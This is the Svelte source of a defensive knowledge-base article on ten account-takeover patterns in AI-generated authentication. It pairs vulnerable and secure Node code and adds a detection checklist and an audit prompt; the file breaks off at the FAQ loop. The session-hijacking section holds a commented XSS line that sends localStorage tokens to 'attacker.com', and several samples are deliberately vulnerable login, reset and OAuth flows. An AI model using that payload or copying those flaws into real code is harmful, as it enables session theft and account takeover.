<script lang="ts">
	import { Header } from '$lib/components/layout';

	// Page metadata
	const meta = {
		title: 'Account Takeover: 10 Attack Patterns in AI-Generated Auth',
		description: 'Account takeover lets attackers steal user accounts through weak auth patterns. FBI reports $262M in losses. Find & fix all 10 attack vectors.',
		url: '/kb/security/vulnerabilities/account-takeover/'
	};

	// Breadcrumbs
	const breadcrumbs = [
		{ label: 'Knowledge Base', href: '/kb' },
		{ label: 'Security', href: '/kb/security' },
		{ label: 'Vulnerabilities', href: '/kb/security/vulnerabilities' },
		{ label: 'Account Takeover' }
	];

	// Real external data sources
	const owaspData = {
		category: 'A07:2021 - Identification and Authentication Failures',
		source: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
		cweId: 'CWE-306',
		cweSource: 'https://cwe.mitre.org/data/definitions/306.html'
	};

	// Attack patterns data
	const attackPatterns = [
		{ name: 'Credential Stuffing', prevalence: 'Automated', timeToExploit: '<5 min' },
		{ name: 'Password Reset Hijacking', prevalence: 'Common', timeToExploit: '<10 min' },
		{ name: 'Session Hijacking', prevalence: 'Common', timeToExploit: '<2 min' },
		{ name: 'Session Fixation', prevalence: 'Moderate', timeToExploit: '<5 min' },
		{ name: 'OAuth Flow Attacks', prevalence: 'Rising', timeToExploit: '<15 min' },
		{ name: 'MFA Bypass', prevalence: 'Rising', timeToExploit: '1-24 hrs' },
		{ name: 'Social Engineering', prevalence: 'Common', timeToExploit: 'Hours-Days' },
		{ name: 'SIM Swapping', prevalence: 'Moderate', timeToExploit: '1-6 hrs' },
		{ name: 'Email Account Compromise', prevalence: 'Common', timeToExploit: 'Varies' },
		{ name: 'Support Desk Manipulation', prevalence: 'Moderate', timeToExploit: '15 min-2 hrs' }
	];

	// FAQ data for schema
	const faqs = [
		{
			question: 'Does MFA actually prevent account takeover?',
			answer: 'MFA blocks most attacks, but not all. Credential stuffing and password reset hijacking get stopped cold. But attackers bypass MFA through SIM swapping, phishing for TOTP codes, session hijacking after login, and social engineering support teams. Cisco Talos reported 50% of their Q1 2024 incident responses involved successful MFA bypass. It\'s defense in depth, not a silver bullet.'
		},
		{
			question: 'Can account takeover happen even with strong passwords?',
			answer: 'Yes. Session hijacking, OAuth flow attacks, password reset manipulation, SIM swapping, and support desk social engineering all work regardless of password strength. Strong passwords block credential stuffing and brute force, but they\'re just one layer. Sessions, password reset flows, and account recovery are separate attack surfaces.'
		},
		{
			question: 'Why do AI coding tools create vulnerable auth flows?',
			answer: 'AI optimizes for "works fast" not "secure by default." Password reset flows often skip email verification. Session tokens get stored in localStorage without HttpOnly flags. OAuth state parameters go missing. Rate limiting is left as a TODO. The models are trained on quick tutorials and MVP code, not production-hardened auth systems. They generate functional auth that passes basic tests but fails under adversarial pressure.'
		},
		{
			question: 'What is session fixation and how is it different from session hijacking?',
			answer: 'Session fixation is when an attacker sets your session ID before you log in. They give you a link with their chosen session ID, you log in using that session, now they have access to your authenticated session. Session hijacking is stealing an existing valid session token through XSS, network sniffing, or malware. Fixation is preemptive, hijacking is reactive. The fix for fixation is regenerating session IDs on login. The fix for hijacking is HttpOnly cookies, secure flags, and short expiration.'
		},
		{
			question: 'How quickly can attackers exploit these vulnerabilities?',
			answer: 'Credential stuffing runs automated in under 5 minutes. Session hijacking through XSS takes under 2 minutes once the XSS exists. Password reset hijacking via Host header manipulation works in under 10 minutes. OAuth code interception happens in real-time if PKCE is missing. SIM swapping takes 1-6 hours. The automated attacks move fast. The social engineering attacks take longer but succeed regularly.'
		}
	];

	let copiedPrompt = $state(false);
	let copiedCode: { [key: string]: boolean } = $state({});

	function copyPrompt() {
		const prompt = document.getElementById('ai-fix-prompt')?.textContent || '';
		navigator.clipboard.writeText(prompt);
		copiedPrompt = true;
		setTimeout(() => copiedPrompt = false, 2000);
	}

	function copyCode(id: string) {
		const code = document.getElementById(id)?.textContent || '';
		navigator.clipboard.writeText(code);
		copiedCode[id] = true;
		setTimeout(() => copiedCode[id] = false, 2000);
	}
</script>

<svelte:head>
	<title>{meta.title}</title>
	<meta name="description" content={meta.description} />
	<meta property="og:title" content={meta.title} />
	<meta property="og:description" content={meta.description} />
	<meta property="og:url" content={meta.url} />
	<meta property="og:type" content="article" />
	<link rel="canonical" href="https://vibeship.co{meta.url}" />

	<!-- BreadcrumbList Schema -->
	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "BreadcrumbList",
		"itemListElement": [
			{"@type": "ListItem", "position": 1, "name": "Knowledge Base", "item": "https://vibeship.co/kb"},
			{"@type": "ListItem", "position": 2, "name": "Security", "item": "https://vibeship.co/kb/security"},
			{"@type": "ListItem", "position": 3, "name": "Vulnerabilities", "item": "https://vibeship.co/kb/security/vulnerabilities"},
			{"@type": "ListItem", "position": 4, "name": "Account Takeover"}
		]
	}
	</script>`}

	<!-- Schema.org structured data -->
	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "TechArticle",
		"headline": "${meta.title}",
		"description": "${meta.description}",
		"author": {
			"@type": "Organization",
			"name": "VibeShip"
		},
		"publisher": {
			"@type": "Organization",
			"name": "VibeShip",
			"logo": {
				"@type": "ImageObject",
				"url": "https://vibeship.co/logo.png"
			}
		},
		"datePublished": "2025-12-25",
		"dateModified": "2025-12-25"
	}
	</script>`}

	<!-- FAQ Schema -->
	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "FAQPage",
		"mainEntity": ${JSON.stringify(faqs.map(faq => ({
			"@type": "Question",
			"name": faq.question,
			"acceptedAnswer": {
				"@type": "Answer",
				"text": faq.answer
			}
		})))}
	}
	</script>`}
</svelte:head>

<Header {breadcrumbs} />

<div class="content-wrapper">
	<article class="content-main content-wide">
		<!-- Header -->
		<header class="article-header">
			<div class="badge-row">
				<span class="badge badge-critical">Critical</span>
				<span class="badge">CWE-306</span>
				<span class="badge">OWASP A07:2021</span>
			</div>
			<h1>Account Takeover: 10 Attack Patterns in AI-Generated Auth</h1>
			<p class="text-secondary">How attackers steal user accounts through weak authentication patterns common in vibe coded apps</p>
		</header>

		<!-- Quick Answer -->
		<div class="quick-answer">
			<div class="quick-answer-label">Quick Answer</div>
			<p class="quick-answer-text">
				<strong>Your auth code is broken in 10 ways. Attackers know this.</strong>
				The <a href="https://www.ic3.gov/Media/Y2025/PSA250108">FBI IC3 reports 5,100+ ATO complaints and $262 million in business email compromise losses since January 2025</a>.
				They're testing your login endpoint right now—automated tools, credential lists from breaches, OAuth flow manipulation. Account takeover happens when authentication fails under adversarial pressure. This guide shows exactly where AI-generated auth breaks and how to fix all 10 attack vectors before the breach call starts.
			</p>
		</div>

		<!-- Stats Box -->
		<div class="stats-row">
			<div class="stat-box">
				<div class="stat-value critical">$262M</div>
				<div class="stat-label">BEC Losses (FBI 2025)</div>
			</div>
			<div class="stat-box">
				<div class="stat-value critical">2.1B</div>
				<div class="stat-label">Credentials Stolen (2024)</div>
			</div>
			<div class="stat-box">
				<div class="stat-value critical">50%</div>
				<div class="stat-label">Incidents With MFA Bypass</div>
			</div>
			<div class="stat-box">
				<div class="stat-value critical">80%</div>
				<div class="stat-label">Fortune 1000 Affected</div>
			</div>
		</div>
		<p class="data-source">
			Sources: <a href="https://www.ic3.gov/Media/Y2025/PSA250108">FBI IC3 2025</a> |
			<a href="https://blog.talosintelligence.com/threat-roundup-0329-0405/">Cisco Talos Q1 2024</a> |
			<a href="https://www.spycloud.com/resource/2024-annual-identity-exposure-report/">SpyCloud 2024 Report</a>
		</p>

		<!-- What Is It -->
		<section class="article-section">
			<h2>What is account takeover?</h2>
			<p>
				Account takeover is when someone else gains full access to a user's account. Not a failed login attempt. Not suspicious activity. Complete control.
				They log in as the user, access everything the user can access, and the application treats them as legitimate.
			</p>
			<p>
				There's no single vulnerability called "account takeover." It's an outcome, caused by weaknesses in authentication, session management, password reset flows, <a href="/kb/security/vulnerabilities/jwt-vulnerabilities/">MFA implementation</a>, or account recovery processes.
				Attackers exploit these weaknesses using 10 distinct attack patterns.
			</p>
			<p>
				According to <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP A07:2021</a>, identification and authentication failures enable some of the highest-impact breaches.
				The <a href="https://www.spycloud.com/resource/2024-annual-identity-exposure-report/">SpyCloud 2024 Identity Exposure Report</a> documented 2.1 billion credentials stolen by infostealers in 2024 alone.
				This fuels credential stuffing attacks at massive scale.
			</p>
			<p>
				For vibe coders shipping fast with AI tools, this matters more than you think. Every "just generate auth for me" prompt produces functional login flows that pass basic testing.
				What those flows don't pass is adversarial testing. Learn more about <a href="/kb/security/">common security vulnerabilities in vibe coded apps</a>.
			</p>
		</section>

		<!-- The 10 Attack Patterns -->
		<section class="article-section">
			<h2>The 10 attack patterns AI tools create</h2>
			<p>
				Every major AI coding tool generates vulnerable authentication patterns. Ask for user login, password reset, OAuth integration, or session management, and the code looks clean.
				It also leaves attack surfaces wide open. Here's what attackers are testing right now on every vibe coded auth flow.
			</p>

			<!-- Pattern Table -->
			<div class="table-wrapper">
				<table>
					<thead>
						<tr>
							<th>Attack Pattern</th>
							<th>How Common</th>
							<th>Time to Exploit</th>
						</tr>
					</thead>
					<tbody>
						{#each attackPatterns as pattern}
							<tr>
								<td><strong>{pattern.name}</strong></td>
								<td>{pattern.prevalence}</td>
								<td>{pattern.timeToExploit}</td>
							</tr>
						{/each}
					</tbody>
				</table>
			</div>

			<!-- Pattern 1: Credential Stuffing -->
			<div class="pattern-detail">
				<h3>1. Credential Stuffing</h3>
				<p>
					Attackers test leaked username/password pairs from previous breaches against your login endpoint. They use automated tools to try thousands of combinations per minute.
					When users reuse passwords across sites, the attacks succeed.
				</p>
				<p>
					<strong>Why AI creates this:</strong> Generated auth code rarely includes rate limiting, IP-based throttling, or CAPTCHA. The login endpoint accepts unlimited attempts.
					Functional for testing, vulnerable in production.
				</p>

				<div class="code-block vulnerable">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['stuffing-vuln']} onclick={() => copyCode('stuffing-vuln')}>
							{copiedCode['stuffing-vuln'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="stuffing-vuln">{`// No rate limiting - AI's default pattern
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body
  const user = await db.users.findUnique({ where: { email } })

  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // Unlimited login attempts possible
  const token = generateToken(user.id)
  res.json({ token })
})`}</code></pre>
				</div>

				<div class="code-block secure">
					<div class="code-block-header">
						<span class="code-block-lang">Secure Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['stuffing-secure']} onclick={() => copyCode('stuffing-secure')}>
							{copiedCode['stuffing-secure'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="stuffing-secure">{`// Rate limiting + account lockout
import rateLimit from 'express-rate-limit'

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts, try again later'
})

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body
  const user = await db.users.findUnique({ where: { email } })

  // Check if account is locked
  if (user?.lockedUntil && user.lockedUntil > new Date()) {
    return res.status(423).json({ error: 'Account temporarily locked' })
  }

  if (!user || !await bcrypt.compare(password, user.password)) {
    // Increment failed attempts
    if (user) {
      await incrementFailedAttempts(user.id)
    }
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // Reset failed attempts on success
  await resetFailedAttempts(user.id)
  const token = generateToken(user.id)
  res.json({ token })
})`}</code></pre>
				</div>
			</div>

			<!-- Pattern 2: Password Reset Hijacking -->
			<div class="pattern-detail">
				<h3>2. Password Reset Hijacking (Host Header Manipulation)</h3>
				<p>
					Password reset emails contain a link back to your application. If the reset endpoint uses the <code>Host</code> header to construct that URL, attackers can manipulate it.
					They request a password reset for a victim's email, intercept the request, modify the Host header to their own domain, and the victim receives a reset link pointing to the attacker's server.
				</p>
				<p>
					<strong>Why AI creates this:</strong> AI-generated password reset flows use <code>req.headers.host</code> or <code>req.get('host')</code> to build URLs dynamically. Convenient but exploitable.
				</p>

				<div class="code-block vulnerable">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['reset-vuln']} onclick={() => copyCode('reset-vuln')}>
							{copiedCode['reset-vuln'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="reset-vuln">{`// Host header used directly - DANGEROUS
app.post('/api/password-reset', async (req, res) => {
  const { email } = req.body
  const user = await db.users.findUnique({ where: { email } })

  if (user) {
    const token = generateResetToken(user.id)
    const resetLink = \`https://\${req.get('host')}/reset?token=\${token}\`

    await sendEmail(email, 'Password Reset', resetLink)
  }

  res.json({ message: 'If account exists, reset email sent' })
})`}</code></pre>
				</div>

				<div class="code-block secure">
					<div class="code-block-header">
						<span class="code-block-lang">Secure Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['reset-secure']} onclick={() => copyCode('reset-secure')}>
							{copiedCode['reset-secure'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="reset-secure">{`// Hardcoded trusted domain
const TRUSTED_DOMAIN = process.env.APP_URL // e.g., 'https://example.com'

app.post('/api/password-reset', async (req, res) => {
  const { email } = req.body
  const user = await db.users.findUnique({ where: { email } })

  if (user) {
    const token = generateResetToken(user.id)
    const resetLink = \`\${TRUSTED_DOMAIN}/reset?token=\${token}\`

    await sendEmail(email, 'Password Reset', resetLink)
  }

  res.json({ message: 'If account exists, reset email sent' })
})`}</code></pre>
				</div>
			</div>

			<!-- Pattern 3: Session Hijacking -->
			<div class="pattern-detail">
				<h3>3. Session Hijacking (XSS Token Theft)</h3>
				<p>
					If session tokens are accessible to JavaScript, an XSS vulnerability anywhere in the application can steal them.
					Attackers inject a script that reads the token and sends it to their server. Now they have the victim's authenticated session.
				</p>
				<p>
					<strong>Why AI creates this:</strong> AI code stores tokens in <code>localStorage</code> or cookies without the <code>HttpOnly</code> flag. Convenient for frontend access, exposed to XSS.
				</p>

				<div class="code-block vulnerable">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['session-vuln']} onclick={() => copyCode('session-vuln')}>
							{copiedCode['session-vuln'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="session-vuln">{`// localStorage token - accessible to XSS
app.post('/api/login', async (req, res) => {
  // ... authentication logic ...

  const token = generateToken(user.id)

  // Frontend stores in localStorage
  res.json({ token }) // Client does: localStorage.setItem('token', token)
})

// Any XSS can steal it:
// <script>fetch('https://attacker.com?token=' + localStorage.getItem('token'))</script>`}</code></pre>
				</div>

				<div class="code-block secure">
					<div class="code-block-header">
						<span class="code-block-lang">Secure Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['session-secure']} onclick={() => copyCode('session-secure')}>
							{copiedCode['session-secure'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="session-secure">{`// HttpOnly cookie - NOT accessible to JavaScript
app.post('/api/login', async (req, res) => {
  // ... authentication logic ...

  const token = generateToken(user.id)

  res.cookie('sessionToken', token, {
    httpOnly: true,    // Cannot be read by JavaScript
    secure: true,      // Only sent over HTTPS
    sameSite: 'strict', // Prevents cookie from being sent in cross-site requests
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  })

  res.json({ success: true })
})

// XSS cannot access HttpOnly cookies
// Even with XSS, token is protected`}</code></pre>
				</div>
			</div>

			<!-- Pattern 4: Session Fixation -->
			<div class="pattern-detail">
				<h3>4. Session Fixation</h3>
				<p>
					Attackers set a victim's session ID before the victim logs in. The victim authenticates using the attacker's predetermined session ID.
					Now the attacker's session is authenticated as the victim.
				</p>
				<p>
					<strong>Why AI creates this:</strong> Generated auth flows reuse session IDs across the login boundary. The session ID created pre-login persists post-login.
				</p>

				<div class="code-block vulnerable">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['fixation-vuln']} onclick={() => copyCode('fixation-vuln')}>
							{copiedCode['fixation-vuln'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="fixation-vuln">{`// Session ID persists across login - DANGEROUS
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body
  const user = await db.users.findUnique({ where: { email } })

  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // Session ID not regenerated - uses same ID from pre-auth state
  req.session.userId = user.id
  res.json({ success: true })
})

// Attack: Attacker sets victim's session ID, victim logs in, attacker has access`}</code></pre>
				</div>

				<div class="code-block secure">
					<div class="code-block-header">
						<span class="code-block-lang">Secure Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['fixation-secure']} onclick={() => copyCode('fixation-secure')}>
							{copiedCode['fixation-secure'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="fixation-secure">{`// Regenerate session ID on login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body
  const user = await db.users.findUnique({ where: { email } })

  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // Regenerate session ID on privilege change
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' })

    req.session.userId = user.id
    res.json({ success: true })
  })
})

// Old session ID is invalidated, attacker's fixed ID is useless`}</code></pre>
				</div>
			</div>

			<!-- Pattern 5: OAuth Flow Attacks -->
			<div class="pattern-detail">
				<h3>5. OAuth Flow Attacks (Authorization Code Interception)</h3>
				<p>
					OAuth flows return an authorization code in the URL. Without PKCE (Proof Key for Code Exchange—a security extension that prevents code interception), attackers can intercept this code and exchange it for an access token.
					In mobile apps or SPAs, this is especially dangerous.
				</p>
				<p>
					<strong>Why AI creates this:</strong> AI-generated OAuth implementations skip PKCE. The basic flow works for web apps but is vulnerable for public clients.
				</p>

				<div class="code-block vulnerable">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['oauth-vuln']} onclick={() => copyCode('oauth-vuln')}>
							{copiedCode['oauth-vuln'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="oauth-vuln">{`// OAuth without PKCE - vulnerable to code interception
app.get('/api/oauth/callback', async (req, res) => {
  const { code } = req.query

  // Exchange code for token - no PKCE verification
  const tokenResponse = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    body: JSON.stringify({
      code,
      client_id: process.env.CLIENT_ID,
      client_secret: process.env.CLIENT_SECRET,
      redirect_uri: process.env.REDIRECT_URI,
      grant_type: 'authorization_code'
    })
  })

  const { access_token } = await tokenResponse.json()
  // ... use access_token ...
})`}</code></pre>
				</div>

				<div class="code-block secure">
					<div class="code-block-header">
						<span class="code-block-lang">Secure Pattern</span>
						<button class="copy-btn" class:copied={copiedCode['oauth-secure']} onclick={() => copyCode('oauth-secure')}>
							{copiedCode['oauth-secure'] ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<pre><code id="oauth-secure">{`// OAuth with PKCE
import crypto from 'crypto'

// Step 1: Generate code verifier and challenge
function generatePKCE() {
  const verifier = crypto.randomBytes(32).toString('base64url')
  const challenge = crypto.createHash('sha256').update(verifier).digest('base64url')
  return { verifier, challenge }
}

// Step 2: Store verifier, send challenge in auth request
app.get('/api/oauth/login', (req, res) => {
  const { verifier, challenge } = generatePKCE()
  req.session.codeVerifier = verifier

  const authUrl = new URL('https://oauth-provider.com/authorize')
  authUrl.searchParams.set('client_id', process.env.CLIENT_ID)
  authUrl.searchParams.set('redirect_uri', process.env.REDIRECT_URI)
  authUrl.searchParams.set('code_challenge', challenge)
  authUrl.searchParams.set('code_challenge_method', 'S256')

  res.redirect(authUrl.toString())
})

// Step 3: Verify code with stored verifier
app.get('/api/oauth/callback', async (req, res) => {
  const { code } = req.query
  const verifier = req.session.codeVerifier

  const tokenResponse = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    body: JSON.stringify({
      code,
      client_id: process.env.CLIENT_ID,
      redirect_uri: process.env.REDIRECT_URI,
      grant_type: 'authorization_code',
      code_verifier: verifier // PKCE proof
    })
  })

  const { access_token } = await tokenResponse.json()
  // ... use access_token ...
})`}</code></pre>
				</div>
			</div>

			<!-- Pattern 6: MFA Bypass -->
			<div class="pattern-detail">
				<h3>6. MFA Bypass</h3>
				<p>
					MFA blocks most attacks, but attackers bypass it through SIM swapping, MFA fatigue (push bombing), phishing for TOTP codes (Time-based One-Time Password—the 6-digit codes from authenticator apps), session hijacking post-MFA, or social engineering support teams.
					<a href="https://blog.talosintelligence.com/threat-roundup-0329-0405/">Cisco Talos reported 50% of Q1 2024 incident responses involved successful MFA bypass</a>.
				</p>
				<p>
					<strong>Common bypass methods:</strong>
				</p>
				<ul>
					<li><strong>SIM Swapping:</strong> Attacker convinces carrier to transfer victim's phone number to attacker's SIM. SMS-based MFA codes now go to attacker.</li>
					<li><strong>MFA Fatigue:</strong> Attacker spams push notifications until victim accidentally approves or approves to stop the spam.</li>
					<li><strong>Phishing:</strong> Fake login page captures username, password, AND the TOTP code the user enters.</li>
					<li><strong>Session Hijacking:</strong> If session tokens aren't protected post-MFA, <a href="/kb/security/vulnerabilities/xss/">XSS</a> or network attacks still work.</li>
					<li><strong>Support Desk:</strong> Social engineer support staff into disabling MFA on the account.</li>
				</ul>
				<p>
					<strong>Why AI creates this:</strong> AI implements basic MFA but doesn't handle edge cases. No device binding, no impossible travel detection, no backup code rate limiting, no session invalidation on MFA reset.
				</p>
			</div>

			<!-- Pattern 7-10: Quick Overview -->
			<div class="pattern-detail">
				<h3>7. Social Engineering / Phishing</h3>
				<p>
					Attackers create fake login pages identical to your application. Victims enter credentials, attackers capture them in real-time and use them immediately on the real site.
					Works even with MFA if the phishing page proxies requests through to the real application.
				</p>
			</div>

			<div class="pattern-detail">
				<h3>8. SIM Swapping</h3>
				<p>
					Attacker convinces mobile carrier to transfer victim's phone number to a new SIM card the attacker controls. Now all SMS-based authentication (password resets, MFA codes) go to the attacker.
					Bypasses SMS-based MFA entirely.
				</p>
			</div>

			<div class="pattern-detail">
				<h3>9. Email Account Compromise (EAC)</h3>
				<p>
					If attackers gain access to a user's email account, they control password resets, email-based MFA, and account recovery flows.
					Email becomes the master key to every account tied to that email address.
				</p>
			</div>

			<div class="pattern-detail">
				<h3>10. Support Desk Manipulation</h3>
				<p>
					Attackers social engineer support teams into resetting passwords, disabling MFA, or changing account email addresses.
					They impersonate the user convincingly enough that support staff bypass normal security procedures.
				</p>
			</div>
		</section>

		<!-- Detection -->
		<section class="article-section">
			<h2>How do I detect these vulnerabilities?</h2>
			<p>
				Detection requires testing authentication flows under adversarial conditions. Check for rate limiting, session handling, OAuth security parameters, and MFA implementation gaps.
				Use <a href="/kb/tools/">security scanning tools built for vibe coded apps</a> to automate this.
			</p>

			<div class="alert alert-warning">
				<h3 class="alert-title">Detection Checklist</h3>
				<ul>
					<li><strong>Credential Stuffing:</strong> Test login endpoint with 100+ requests. Does it throttle or block?</li>
					<li><strong>Password Reset:</strong> Intercept reset request, modify Host header. Where does the reset link point?</li>
					<li><strong>Session Hijacking:</strong> Check where session tokens are stored. <code>localStorage</code>? Check cookie flags (HttpOnly, Secure, SameSite).</li>
					<li><strong>Session Fixation:</strong> Set a session ID before login, log in, check if session ID changed.</li>
					<li><strong>OAuth:</strong> Check OAuth implementation for <code>state</code> parameter and PKCE (<code>code_challenge</code>, <code>code_verifier</code>).</li>
					<li><strong>MFA:</strong> Test backup codes, check for rate limiting on code attempts, verify session invalidation on MFA reset.</li>
				</ul>
			</div>

			<div class="cta-box">
				<h3>Behavioral Detection Signals</h3>
				<p>Production monitoring should flag these patterns:</p>
				<ul>
					<li><strong>Impossible Travel:</strong> User logs in from Paris, then Sydney 20 minutes later.</li>
					<li><strong>Device Fingerprint Changes:</strong> Same account, completely different browser fingerprint.</li>
					<li><strong>Velocity Anomalies:</strong> 50 password reset requests in 5 minutes.</li>
					<li><strong>Geographic Anomalies:</strong> User normally in US, sudden login from Russia.</li>
				</ul>
			</div>
		</section>

		<!-- Prevention Matrix -->
		<section class="article-section">
			<h2>Prevention Matrix: Which Defenses Block Which Attacks</h2>
			<p>
				No single defense stops all 10 attacks. Defense in depth is required. This matrix shows which technical controls block which attack patterns.
			</p>

			<div class="table-wrapper">
				<table class="prevention-matrix">
					<thead>
						<tr>
							<th>Attack Pattern</th>
							<th>Rate Limiting</th>
							<th>MFA</th>
							<th>HttpOnly Cookies</th>
							<th>PKCE</th>
							<th>Session Regeneration</th>
							<th>Device Binding</th>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><strong>Credential Stuffing</strong></td>
							<td class="blocks">✓</td>
							<td class="blocks">✓</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="partial">Partial</td>
						</tr>
						<tr>
							<td><strong>Password Reset Hijacking</strong></td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
						</tr>
						<tr>
							<td><strong>Session Hijacking</strong></td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
						</tr>
						<tr>
							<td><strong>Session Fixation</strong></td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
							<td>—</td>
						</tr>
						<tr>
							<td><strong>OAuth Code Interception</strong></td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
							<td>—</td>
							<td>—</td>
						</tr>
						<tr>
							<td><strong>MFA Bypass (Various)</strong></td>
							<td class="partial">Partial</td>
							<td class="partial">Partial</td>
							<td class="blocks">✓</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
						</tr>
						<tr>
							<td><strong>Social Engineering</strong></td>
							<td>—</td>
							<td class="partial">Partial</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="partial">Partial</td>
						</tr>
						<tr>
							<td><strong>SIM Swapping</strong></td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
						</tr>
						<tr>
							<td><strong>Email Account Compromise</strong></td>
							<td>—</td>
							<td class="blocks">✓</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
						</tr>
						<tr>
							<td><strong>Support Desk Manipulation</strong></td>
							<td>—</td>
							<td class="partial">Partial</td>
							<td>—</td>
							<td>—</td>
							<td>—</td>
							<td class="blocks">✓</td>
						</tr>
					</tbody>
				</table>
			</div>

			<p class="matrix-note">
				<strong>Legend:</strong> ✓ = Blocks attack | Partial = Reduces risk | — = No protection
			</p>

			<p>
				Password Reset Hijacking requires hardcoded trusted domains (not shown in matrix). Device binding blocks most social engineering vectors by requiring known device authentication.
			</p>
		</section>

		<!-- AI Fix Prompt -->
		<section class="article-section">
			<h2>AI Fix Prompt: Audit All 10 Attack Patterns</h2>
			<p>
				This comprehensive prompt checks your authentication implementation for all 10 attack vectors. Copy it into Cursor, Claude Code, or Bolt.
			</p>

			<div class="fix-prompt">
				<div class="fix-prompt-header">
					<span class="fix-prompt-label">Copy-paste this prompt</span>
					<button class="copy-btn" class:copied={copiedPrompt} onclick={copyPrompt}>
						{copiedPrompt ? 'Copied!' : 'Copy'}
					</button>
				</div>
				<div class="fix-prompt-content" id="ai-fix-prompt">{`Audit my authentication implementation for all 10 account takeover attack patterns.

## Attack Patterns to Check

### 1. Credential Stuffing
- [ ] Check all login endpoints for rate limiting
- [ ] Verify account lockout after N failed attempts
- [ ] Check for IP-based throttling or CAPTCHA after failures
- [ ] List endpoints without rate limiting

### 2. Password Reset Hijacking
- [ ] Find all password reset flows
- [ ] Check if Host header is used to construct reset URLs
- [ ] Verify APP_URL or TRUSTED_DOMAIN is hardcoded
- [ ] List any dynamic URL construction using req.get('host')

### 3. Session Hijacking (XSS Token Theft)
- [ ] Find where session tokens/JWTs are stored
- [ ] Check for localStorage or sessionStorage usage
- [ ] Verify cookies use httpOnly: true, secure: true, sameSite: 'strict'
- [ ] List all token storage locations

### 4. Session Fixation
- [ ] Find all login/authentication endpoints
- [ ] Check if session ID is regenerated on login
- [ ] Verify req.session.regenerate() or equivalent is called
- [ ] List endpoints that don't regenerate sessions

### 5. OAuth Flow Attacks
- [ ] Find OAuth implementation
- [ ] Check for PKCE (code_challenge, code_verifier)
- [ ] Verify state parameter is used and validated
- [ ] Check if code_verifier is stored securely (session, not client)
- [ ] List OAuth flows without PKCE

### 6. MFA Bypass Vulnerabilities
- [ ] Check MFA implementation
- [ ] Verify backup codes have rate limiting
- [ ] Check if sessions are invalidated when MFA is reset
- [ ] Verify device binding or remember-me is implemented securely
- [ ] Check for MFA push notification rate limiting
- [ ] List MFA gaps

### 7-10. Social Engineering / SIM / Email / Support
- [ ] Check if email verification is required for email changes
- [ ] Verify security questions aren't used (they're weak)
- [ ] Check for device recognition/binding
- [ ] Verify high-value actions require re-authentication
- [ ] List account recovery flows

## What to Output

For each vulnerability found:
1. File path and line number
2. Vulnerable code snippet
3. Which attack pattern it enables
4. Secure replacement code
5. Severity (Critical/High/Medium)

## Fixes to Implement

Provide code for:
- Rate limiting middleware (express-rate-limit or equivalent)
- HttpOnly cookie configuration
- Session regeneration on login
- PKCE OAuth implementation
- Hardcoded trusted domain for password reset
- Account lockout logic

Please proceed systematically through my codebase.`}</div>
			</div>
		</section>

		<!-- FAQ -->
		<section class="article-section">
			<h2>Frequently asked questions</h2>

			<div class="faq-list">
				{#each faqs as faq}
